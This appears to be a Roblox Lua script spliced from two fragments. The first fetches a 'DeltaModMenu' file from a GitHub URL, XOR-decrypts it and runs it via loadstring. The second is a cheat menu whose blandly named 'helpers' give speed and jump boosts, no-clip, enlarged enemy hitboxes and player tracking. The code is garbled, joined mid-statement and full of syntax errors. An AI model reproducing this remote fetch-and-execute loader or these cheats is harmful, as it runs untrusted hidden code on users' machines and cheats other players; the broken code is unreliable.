local HttpService = game:GetService("HttpService")
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Function to fetch and execute code from a URL
local function fetchAndExecuteCode(url)
    local success, response = pcall(function()
        return HttpService:GetAsync(url)
    end)

    if success then
        -- Decrypt the fetched code
        local decryptedCode = decrypt(response)

        -- Execute the decrypted code
        local function, err = loadstring(decryptedCode)
        if function then
            coroutine.wrap(function()
                function()
            end)()
        else
            warn("Error loading string: " .. err)
        end
    else
        warn("Error fetching code from URL: " .. response)
    end
end

-- Function to decrypt the code
local function decrypt(encryptedCode)
    -- Simple XOR decryption example
    local key = "your_decryption_key"
    local decrypted = ""
    for i = 1, #encryptedCode do
        decrypted = decrypted .. string.char(string.byte(encryptedCode, i) ~ string.byte(key, i % #key + 1))
    end
    return decrypted
end

-- Function to create a basic GUI
local function createBasicGui()
    local gui = Instance.new("ScreenGui")
    gui.Name = "TestGui"
    gui.ResetOnSpawn = false
    gui.Parent = playerGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 200, 0, 100)
    frame.Position = UDim2.new(0.5, -100, 0.5, -50)
    frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    frame.BorderSizePixel = 0
    frame.Parent = gui

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.Text = "Test GUI"
    textLabel.TextSize = 24
    textLabel.Font = Enum.Font.SourceSans
    textLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Parent = frame
end

-- Execute the combined test
createBasicGui()
fetchAndExecuteCode("https://raw.githubusercontent.com/maurree/MobileScripts/refs/heads/main/DeltaModMenu.lua")            tooltip.Position = UDim2.new(0, -190, 0, 0)
            tooltip.BackgroundColor3 = Color3.fromRGB(40, 50, 70)
            tooltip.BorderColor3 = Color3.fromRGB(70, 80, 120)
            tooltip.Visible = false
            tooltip.ZIndex = 10
            tooltip.Parent = info
            
            -- Add rounded corners to tooltip
            local tooltipCorner = Instance.new("UICorner")
            tooltipCorner.CornerRadius = UDim.new(0, 6)
            tooltipCorner.Parent = tooltip
            
            local tipText = Instance.new("TextLabel")
            tipText.Size = UDim2.new(1, -10, 1, -10)
            tipText.Position = UDim2.new(0, 5, 0, 5)
            tipText.BackgroundTransparency = 1
            tipText.Text = description
            tipText.TextColor3 = Color3.fromRGB(255, 255, 255)
            tipText.Font = Enum.Font.Gotham
            tipText.TextSize = 12
            tipText.TextWrapped = true
            tipText.ZIndex = 10
            tipText.Parent = tooltip
            
            info.MouseEnter:Connect(function()
                tooltip.Visible = true
            end)
            
            info.MouseLeave:Connect(function()
                tooltip.Visible = false
            end)
            
            local toggle = Instance.new("TextButton")
            toggle.Size = UDim2.new(0.2, -5, 1, -6)
            toggle.Position = UDim2.new(0.8, 0, 0, 3)
            toggle.BackgroundColor3 = stateVar == "balanceHelper" and Color3.fromRGB(80, 170, 80) or Color3.fromRGB(60, 70, 100)
            toggle.Text = stateVar == "balanceHelper" and "ON" or "OFF"
            toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
            toggle.Font = Enum.Font.Gotham
            toggle.TextSize = 14
            toggle.Parent = option
            
            -- Add rounded corners to toggle button
            local toggleBtnCorner = Instance.new("UICorner")
            toggleBtnCorner.CornerRadius = UDim.new(0, 4)
            toggleBtnCorner.Parent = toggle
            
            toggle.MouseButton1Click:Connect(function()
                state[stateVar] = not state[stateVar]
                toggle.Text = state[stateVar] and "ON" or "OFF"
                toggle.BackgroundColor3 = state[stateVar] and Color3.fromRGB(80, 170, 80) or Color3.fromRGB(60, 70, 100)
                
                if state[stateVar] and onFunc then
                    onFunc()
                elseif not state[stateVar] and offFunc then
                    offFunc()
                end
            end)
            
            return toggle
        end
        
        -- Movement helper
        local function applyMoveHelper()
            local character = player.Character
            if character then
                local humanoid = character:FindFirstChild("Humanoid")
                if humanoid then
                    humanoid.WalkSpeed = 60
                    
                    -- Hook property changes
                    if not state.savedData.moveHooked then
                        state.savedData.moveHooked = true
                        humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
                            if state.moveHelper and humanoid.WalkSpeed < 60 then
                                humanoid.WalkSpeed = 60
                            end
                        end)
                    end
                end
            end
        end
        
        -- Jump helper
        local function applyJumpHelper()
            local character = player.Character
            if character then
                local humanoid = character:FindFirstChild("Humanoid")
                if humanoid then
                    humanoid.JumpPower = 100
                    
                    -- Hook property changes
                    if not state.savedData.jumpHooked then
                        state.savedData.jumpHooked = true
                        humanoid:GetPropertyChangedSignal("JumpPower"):Connect(function()
                            if state.jumpHelper and humanoid.JumpPower < 100 then
                                humanoid.JumpPower = 100
                            end
                        end)
                    end
                end
            end
        end
        
        -- Path helper
        local function applyPathHelper()
            local character = player.Character
            if character then
                for _, part in pairs(character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        if not state.savedData[part] then
                            state.savedData[part] = part.CanCollide
                        end
                        part.CanCollide = false
                    end
                end
            end
        end
        
        -- Reset path
        local function resetPathHelper()
            for part, canCollide in pairs(state.savedData) do
                if part and part.Parent and typeof(canCollide) == "boolean" then
                    part.CanCollide = canCollide
                end
            end
        end
        
        -- Visibility helper
        local function applyVisHelper()
            local character = player.Character
            if not character then return end
            
            local myRoot = character:FindFirstChild("HumanoidRootPart")
            if not myRoot then return end
            
            for _, otherPlayer in pairs(game:GetService("Players"):GetPlayers()) do
                if otherPlayer ~= player and otherPlayer.Character then
                    local enemyRoot = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if enemyRoot then
                        -- Store original values
                        if not state.savedData[otherPlayer.Name] then
                            state.savedData[otherPlayer.Name] = {
                                size = enemyRoot.Size,
                                transparency = enemyRoot.Transparency
                            }
                        end
                        
                        -- Improve visibility
                        enemyRoot.Size = state.savedData[otherPlayer.Name].size * 4
                        enemyRoot.Transparency = 0.5
                        enemyRoot.CanCollide = false
                        enemyRoot.Material = Enum.Material.ForceField
                    end
                end
            end
        end
        
        -- Reset visibility
        local function resetVisHelper()
            for name, data in pairs(state.savedData) do
                if typeof(data) == "table" and data.size then
                    local otherPlayer = game:GetService("Players"):FindFirstChild(name)
                    if otherPlayer and otherPlayer.Character then
                        local root = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
                        if root then
                            root.Size = data.size
                            root.Transparency = data.transparency
                            root.Material = Enum.Material.Plastic
                        end
                    end
                end
            end
        end
        
        -- Boundary helper
        local function applyBoundHelper()
            for _, otherPlayer in pairs(game:GetService("Players"):GetPlayers()) do
                if otherPlayer ~= player and otherPlayer.Character then
                    local root = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if root then
                        -- Store original values
                        if not state.savedData[otherPlayer.Name.."_bound"] then
                            state.savedData[otherPlayer.Name.."_bound"] = {
                                size = root.Size,
                                transparency = root.Transparency
                            }
                        end
                        
                        -- Create visual indicator
                        if not workspace:FindFirstChild("BoundaryHelper_"..otherPlayer.Name) then
                            local indicator = Instance.new("Part")
                            indicator.Name = "BoundaryHelper_"..otherPlayer.Name
                            indicator.Size = Vector3.new(8, 8, 8)
                            indicator.Transparency = 0.7
                            indicator.Color = Color3.fromRGB(80, 170, 240)
                            indicator.Material = Enum.Material.ForceField
                            indicator.CanCollide = false
                            indicator.Anchored = true
                            indicator.Parent = workspace
                            
                            -- Update position
                            spawn(function()
                                while state.boundHelper and indicator and indicator.Parent do
                                    if root and root.Parent then
                                        indicator.CFrame = root.CFrame
                                    end
                                    wait(0.05)
                                end
                            end)
                        end
                    end
                end
            end
        end
        
        -- Reset boundaries
        local function resetBoundHelper()
            for _, obj in pairs(workspace:GetChildren()) do
                if obj.Name:find("BoundaryHelper_") then
                    obj:Destroy()
                end
            end
        end
        
        -- Balance helper
        local function applyBalanceHelper()
            local character = player.Character
            if not character then return end
            
            -- Make character parts stable
            for _, part in pairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CustomPhysicalProperties = PhysicalProperties.new(100, 0, 1, 100, 100)
                end
            end
            
            -- Create balance force
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                -- Remove old stabilizer if exists
                for _, child in pairs(root:GetChildren()) do
                    if child.Name == "BalanceHelper" then
                        child:Destroy()
                    end
                end
                
                -- Create new stabilizer
                local stabilizer = Instance.new("BodyVelocity")
                stabilizer.Name = "BalanceHelper"
                stabilizer.MaxForce = Vector3.new(50000, 50000, 50000)
                stabilizer.P = 1250
                stabilizer.Velocity = Vector3.new(0, 0, 0)
                stabilizer.Parent = root
                
                -- Update stabilizer
                spawn(function()
                    while state.balanceHelper and stabilizer and stabilizer.Parent do
                        if root and root.Velocity.Magnitude > 50 then
                            stabilizer.Velocity = Vector3.new(0, 0, 0)
                        else
                            stabilizer.Velocity = Vector3.new(0, 0, 0)
                        end
                        wait(0.05)
                    end
                end)
            end
        }
        
        -- Reset balance
        local function resetBalanceHelper()
            local character = player.Character
            if character then
                local root = character:FindFirstChild("HumanoidRootPart")
                if root then
                    for _, child in pairs(root:GetChildren()) do
                        if child.Name == "BalanceHelper" then
                            child:Destroy()
                        end
                    end
                end
            end
        end
        
        -- Action helper
        local function applyActionHelper()
            -- Find interactive buttons
            for _, gui in pairs(player.PlayerGui:GetChildren()) do
                if gui:IsA("ScreenGui") then
                    for _, obj in pairs(gui:GetDescendants()) do
                        if (obj:IsA("TextButton") or obj:IsA("ImageButton")) and
                           (obj.Name:lower():find("attac") or 
                            (obj.Text and obj.Text:lower():find("attac")) or
                            obj.Position.X > gui.AbsoluteSize.X * 0.6) then
                            
                            -- Hook if not already hooked
                            if not obj:GetAttribute("assisted") then
                                obj:SetAttribute("assisted", true)
                                
                                obj.MouseButton1Down:Connect(function()
                                    if state.actionHelper then
                                        local now = tick()
                                        if now - state.lastTime >= 0.3 then
                                            state.lastTime = now
                                            
                                            -- Visual feedback
                                            local flash = Instance.new("Frame")
                                            flash.Size = UDim2.new(1, 0, 1, 0)
                                            flash.BackgroundColor3 = Color3.fromRGB(80, 170, 240)
                                            flash.BackgroundTransparency = 0.7
                                            flash.BorderSizePixel = 0
                                            flash.Parent = obj
                                            game:GetService("Debris"):AddItem(flash, 0.1)
                                        end
                                    end
                                end)
                            end
                        end
                    end
                end
            end
        end
        
        -- Create options
        createOption("Movement", "Helps you move more smoothly through the game", 40, "moveHelper", applyMoveHelper, function()
            local character = player.Character
            if character and character:FindFirstChild("Humanoid") then
                character.Humanoid.WalkSpeed = 16
            end
        end)
        
        createOption("Jump Height", "Helps you reach higher platforms more easily", 80, "jumpHelper", applyJumpHelper, function()
            local character = player.Character
            if character and character:FindFirstChild("Humanoid") then
                character.Humanoid.JumpPower = 50
            end
        end)
        
        createOption("Path Helper", "Helps navigate through tight spaces more easily", 120, "pathHelper", applyPathHelper, resetPathHelper)
        
        createOption("Visibility", "Improves visibility of other players in the game", 160, "visHelper", applyVisHelper, resetVisHelper)
        
        createOption("Boundaries", "Shows interaction boundaries for better gameplay", 200, "boundHelper", applyBoundHelper, resetBoundHelper)
        
        createOption("Balance", "Helps maintain balance during intense gameplay", 240, "balanceHelper", applyBalanceHelper, resetBalanceHelper)
        
        createOption("Action Assist", "Helps with timing of game actions", 280, "actionHelper", applyActionHelper)
        
        -- Apply balance immediately
        applyBalanceHelper()
        
        -- Main update loop
        runService.Heartbeat:Connect(function()
            pcall(function()
                if state.moveHelper then applyMoveHelper() end
                if state.jumpHelper then applyJumpHelper() end
                if state.pathHelper then applyPathHelper() end
                if state.visHelper then applyVisHelper() end
                if state.boundHelper then applyBoundHelper() end
                if state.balanceHelper then applyBalanceHelper() end
            end)
        end)
        
        -- Handle respawn
        player.CharacterAdded:Connect(function()
            wait(1)
            
            -- Reset stored data
            for k, v in pairs(state.savedData) do
                if typeof(v) ~= "boolean" and typeof(v) ~= "table" then
                    state.savedData[k] = nil
                end
            end
            
            -- Reapply active helpers
            if state.balanceHelper then applyBalanceHelper() end
            if state.actionHelper then applyActionHelper() end
        end)
    end
end

-- Load with friendly delay
task.spawn(function()
    loadAssistant()
end)
